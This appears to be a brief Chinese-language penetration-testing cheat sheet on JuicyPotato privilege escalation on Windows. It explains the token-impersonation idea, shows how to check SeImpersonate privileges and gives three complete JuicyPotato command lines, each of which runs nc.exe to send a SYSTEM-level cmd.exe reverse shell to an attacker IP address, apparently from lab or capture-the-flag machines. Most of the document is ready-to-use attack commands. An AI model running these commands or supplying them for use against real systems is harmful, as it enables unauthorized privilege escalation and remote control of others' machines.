# Juicypotato 提权 (1)

利用<ms16-075>
原理：诱骗用户尝试使用NTLM对他的计算机进行身份验证，则他可以将该身份验证尝试中继到另一台计算机。NTLM的反射
[https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html](https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html)
理解：控制HTTP流量到SMB服务器中，做中间人攻击，劫持高权限的令牌后模拟令牌
过程</ms16-075>

1. 查看是否符合要求
whoami /all
whoami /priv
如果开启SeImpersonate权限，juicypotato的参数可以使用-t t
如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u
均开启，可以选择-t * 如未开启则不可用
2. 选择对应的CLSID
[https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)
3. juicypotato.exe -l 1337 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}" -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\nc.exe -e cmd.exe 192.168.119.156 6666 " -t *

WebShell版烂土豆
JuicyPotato.exe -p whoami
[https://github.com/uknowsec/JuicyPotato](https://github.com/uknowsec/JuicyPotato)

```bash
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\drupal-7.54\TEMP\nc.exe -e cmd.exe 10.10.16.3 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

```bash
cmd /c JuicyPotato64.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\ProgramData\nc.exe -e cmd.exe 10.10.14.3 4444" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```